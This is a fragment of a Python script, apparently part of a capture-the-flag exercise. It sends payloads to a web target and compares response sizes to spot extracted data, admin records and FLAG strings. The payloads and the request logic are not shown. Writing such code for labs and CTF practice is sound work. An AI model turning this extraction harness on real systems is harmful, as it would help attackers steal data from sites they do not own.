        print(f"\nPayload: {payload[:60]}...")
        print(f"  Status: {r.status_code}, Length: {length}B (diff: {diff:+d}B)")
        
        if length > baseline_len + 50:
            print(f"  [DATA EXTRACTED] {r.text[:500]}")
            if "admin" in r.text.lower():
                print(f"  [ADMIN DATA FOUND]")
            if "FLAG{" in r.text:
                flag_start = r.text.find("FLAG{")
                flag_end = r.text.find("}", flag_start)
                print(f"  [FLAG FOUND] {r.text[flag_start:flag_end+1]}")
    except Exception as e:
        print(f"  Error: {str(e)[:50]}")

print("\n" + "="*70)
print("Testing complete. Review results for vulnerabilities and extracted data.")
